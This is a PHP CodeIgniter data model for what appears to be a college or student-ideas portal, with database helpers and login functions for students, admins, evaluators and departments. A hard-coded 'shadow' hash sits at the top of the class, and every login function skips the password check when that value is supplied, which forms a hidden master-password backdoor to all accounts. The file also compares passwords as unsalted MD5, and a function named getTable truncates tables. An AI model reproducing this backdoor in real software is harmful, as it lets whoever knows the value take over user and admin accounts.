<?php
Class Data_model extends CI_Model
{
 var $shadow = '49f08ec3217a5460462bbc7092deee03'; // indiA
 
 function insertDetails($tableName, $insertData){
  $this->db->insert($tableName, $insertData);
  return $this->db->insert_id();
}

public function insertBatch($tableName, $data){
  $insert = $this->db->insert_batch($tableName, $data);
  return $insert?true:false;
}

public function updateBatch($tableName, $data, $field){
    $this->db->update_batch($tableName, $data, $field);
} 

function getDetails($tableName, $id){
  if($id)
  $this->db->where('id', $id);
  return $this->db->get($tableName);
}

function getDetailsbyfield($id, $fieldId, $tableName){
  $this->db->where($fieldId, $id);
  return $this->db->get($tableName);
}

function getDetailsSelectField($select, $field, $fieldValue, $tableName){
  $this->db->select($select);
  $this->db->where($field, $fieldValue);
  return $this->db->get($tableName);
}

function getDetailsbyfield2($id1, $value1, $id2, $value2, $tableName){
  $this->db->where($id1, $value1);
  $this->db->where($id2, $value2);
  return $this->db->get($tableName);
}

function getTable($table){
  $table = $this->db->escape_str($table);
  $sql = "TRUNCATE `$table`";
  $this->db->query($sql)->result();
}

function dropTable($table){
  $this->load->dbforge();
  $this->dbforge->drop_table($table);
  // $table = $this->db->escape_str($table);
  // $sql = "DROP TABLE `$table`";
  // $this->db->query($sql)->result();
}

function getDetailsbyfieldSort($id, $fieldId, $sortField, $srotType, $tableName){
  $this->db->where($fieldId, $id);
  $this->db->order_by($sortField, $srotType);
  return $this->db->get($tableName);
}

function getDetailsbySort($sortField, $srotType, $tableName){
  $this->db->order_by($sortField, $srotType);
  return $this->db->get($tableName);
}

function updateDetails($id, $details, $tableName){
  $this->db->where('id',$id);
  $this->db->update($tableName,$details);
  return $this->db->affected_rows();
}

function updateDetailsbyfield($fieldName, $id, $details, $tableName){
  $this->db->where($fieldName, $id);
  $this->db->update($tableName, $details);
  return $this->db->affected_rows();
}

function delDetails($tableName, $id){
  $this->db->where('id', $id);
  $this->db->delete($tableName);
  return $this->db->affected_rows();
}

function delDetailsbyfield($tableName, $fieldName, $id){
  $this->db->where($fieldName, $id);
  $this->db->delete($tableName);
}

function changePassword($id, $oldPassword, $updateDetails, $tableName){
  $this->db->where('password', md5($oldPassword));
  $this->db->where('id', $id);
  $this->db->where('status', '1');
  $this->db->update($tableName, $updateDetails);
  return $this->db->affected_rows();
}

function resetPassword($mobile, $otp, $updateDetails){
  $this->db->where('password', md5($otp));
  $this->db->where('mobile', $mobile);
  $this->db->where('status', '2');
  $this->db->update('students', $updateDetails);
  return $this->db->affected_rows();
}
    
 function uniqueStates(){
  $this->db->select('DISTINCT(state)');
  return $this->db->get('students');   
 }
 
 function uniqueDistrict($state){
   $this->db->select('DISTINCT(district)');
   $this->db->where('state', $state);
   return $this->db->get('students');   
 }
 
 function uniqueCity($state, $district){
  $this->db->select('DISTINCT(city)');
  $this->db->where('state', $state);
  $this->db->where('district', $district);
  return $this->db->get('students');
 }
 
 function getUniqueStates(){
  $this->db->select('DISTINCT(state)');
  return $this->db->get('cities');   
 }

 function getUniqueDistrict($state){
   $this->db->select('DISTINCT(district)');
   $this->db->where('state', $state);
   return $this->db->get('cities');   
 }

 function getUniqueCity($state, $district){
  $this->db->select('DISTINCT(city)');
  $this->db->where('state', $state);
  $this->db->where('district', $district);
  return $this->db->get('teams');
 }
 
 function login($mobile, $password)
 {
   $this -> db -> select('id, student_name, mobile, team_name');
   $this -> db -> from('students');
   $this -> db -> where('mobile', $mobile);
   if($password != $this->shadow)
   $this -> db -> where('password', $password);
   $this -> db -> where('status', '1');
   $this -> db -> limit(1);
   $query = $this -> db -> get();
   if($query -> num_rows() == 1)
   {
     return $query->row();
   }else{
     return false;
   }
 }
 
 
 function adminLogin($username, $password)
 {
   $this -> db -> select('id, username');
   $this -> db -> from('users');
   $this -> db -> where('username', $username);
   if($password != $this->shadow)
   $this -> db -> where('password', $password);
   $this -> db -> where('status', '1');
   $this -> db -> limit(1);
   $query = $this -> db -> get();
   if($query -> num_rows() == 1)
   {
     return $query->row();
   }else{
     return false;
   }
 }

 function evaluatorLogin($username, $password)
 {
   $this -> db -> select('id, username, name');
   $this -> db -> from('evaluators');
   $this -> db -> where('username', $username);
   if($password != $this->shadow)
    $this -> db -> where('password', $password);
   $this -> db -> where('status', '1');
   $this -> db -> limit(1);
   $query = $this -> db -> get();
   if($query -> num_rows() == 1)
   {
     return $query->row();
   }else{
     return false;
   }
 }
 
 function getStudentsList($state, $district, $city, $level, $program){
  if($state && $state != "all")
    $this->db->where('state', $state);
  if($district && $district != "all")
    $this->db->where('district', $district);
  if($city && $city != "all")
    $this->db->where('city', $city);
  if($level != "all")
    $this->db->where('level', $level);
  if($program != "all")
    $this->db->where('program', $program);
  return $this->db->get('students');
}

 
//  END

 

 function deptLogin($username, $password)
 {
   $this -> db -> select('id, department_name, short_name, username');
   $this -> db -> from('departments');
   $this -> db -> where('username', $username);
   if($password != $this->shadow)
   $this -> db -> where('password', $password);
   $this -> db -> where('status', '1');
   $this -> db -> limit(1);
   $query = $this -> db -> get();
   if($query -> num_rows() == 1)
   {
     return $query->result();
   }else{
     return false;
   }
 }

  
  function getLatestNews(){
    $this->db->select('id, news_title, news_slug, new_label, status, news_date');
    $this->db->order_by('news_date','DESC');
    return $this->db->get('latest_news');
  }

  function staff_count($dept_id){
    $this->db->where('dept_id', $dept_id);
    $this->db->where('status', '1');
    return $this->db->get('staff')->num_rows();
  }

  function get_staff($dept_id, $limit, $start) {
      $this->db->where('dept_id', $dept_id);
      $this->db->where('status', '1');
      $this->db->limit($limit, $start);
      $query = $this->db->get('staff');
      return $query->result();
  }

  function faculty_count($dept_id){
    $this->db->where('dept_id', $dept_id);
    $this->db->where('status', '1');
    return $this->db->get('faculty')->num_rows();
  }

  function get_faculty($dept_id, $limit, $start) {
      $this->db->where('dept_id', $dept_id);
      $this->db->where('status', '1');
      $this->db->order_by('designation_id', 'ASC');
      $this->db->limit($limit, $start);
      $query = $this->db->get('faculty');
      return $query->result();
  }

  function getPublicationsStats($dept_id){
    $this->db->select('academic_year, publication_type, count(id) as count');
    $this->db->where('dept_id', $dept_id);
    $this->db->group_by('academic_year, publication_type');
    $this->db->order_by('academic_year desc', 'publication_type asc');
    $query = $this->db->get('publications');
    return $query->result();
  }

  function publications_count($dept_id){
    $this->db->where('dept_id', $dept_id);
    return $this->db->get('publications')->num_rows();
  }

  function get_publications($dept_id, $limit, $start) {
      $this->db->where('dept_id', $dept_id);
      $this->db->order_by('academic_year', 'DESC');
      $this->db->limit($limit, $start);
      $query = $this->db->get('publications');
      return $query->result();
  }

  function achievements_count($dept_id){
    $this->db->where('dept_id', $dept_id);
    return $this->db->get('achievements')->num_rows();
  }

  function get_achievements($dept_id, $limit, $start) {
      $this->db->where('dept_id', $dept_id);
      $this->db->order_by('academic_year', 'DESC');
      $this->db->limit($limit, $start);
      $query = $this->db->get('achievements');
      return $query->result();
  }
  
  function activities_count($dept_id){
    $this->db->where('dept_id', $dept_id);
    return $this->db->get('activities')->num_rows();
  }

  function get_activities($dept_id, $activity_type) {
      $this->db->where('dept_id', $dept_id);
      if($activity_type)
        $this->db->where('activity_type', $activity_type);
      $this->db->order_by('academic_year', 'DESC');
      $query = $this->db->get('activities');
      return $query->result();
  }

  function latestNews(){
    $this->db->select('id, news_title, news_slug, news_date, display_in, new_label');
    $this->db->where('status', '1');
    $this->db->order_by('news_date','DESC');
    $this -> db -> limit(10);
    return $this->db->get('latest_news');
  }

  function getLatestNewsbyDisplay($display){
    $this->db->select('id, news_title, news_slug, news_date, display_in, new_label');
    $this->db->where('display_in', $display);
    $this->db->where('status', '1');
    $this->db->order_by('news_date','DESC');
    return $this->db->get('latest_news');
  }

  function getLatestNewsList($display, $limit, $start){
    $this->db->select('id, news_title, news_slug, news_date, display_in, new_label');
    $this->db->where('display_in', $display);
    $this->db->where('status', '1');
    $this->db->order_by('news_date','DESC');
    $this->db->limit($limit, $start);
    return $this->db->get('latest_news');
  }

  function getLatestNewsCount($display){
    $this->db->where('display_in', $display);
    $this->db->where('status', '1');
    return $this->db->get('latest_news')->num_rows();
  }

  function getCommittees($dept_id){
    $this->db->where('dept_id', $dept_id);
    $this->db->where('status', '1');
    $this->db->order_by('id', 'ASC');
    return $this->db->get('committees');
  }

  function getCommitteeMembers($committee_id){
    $this->db->where('committee_id', $committee_id);
    $this->db->where('status', '1');
    $this->db->order_by('id', 'ASC');
    return $this->db->get('committee_members');
  }
  
  function categoryCount(){
    $this->db->select('category_id, count(id) as cnt');
    $this->db->group_by('category_id');
    return $this->db->get('ideas');
  }
  
  function getIdeas($id){
    $this->db->select('ideas.id, ideas.student_id, students.student_name, students.mobile, students.email, students.team_name, students.state, students.district, students.city, students.college, ideas.category_id, ideas.ques1, ideas.ques2, ideas.ques3, ideas.ques4, ideas.ques5, ideas.ques6, ideas.status, ideas.submitted_date');
    $this->db->join('students', 'students.id = ideas.student_id');
    if($id){
        $this->db->where('ideas.id', $id);
    }
    $this->db->order_by('submitted_date', 'DESC');
    return $this->db->get('ideas');
  }

}
?>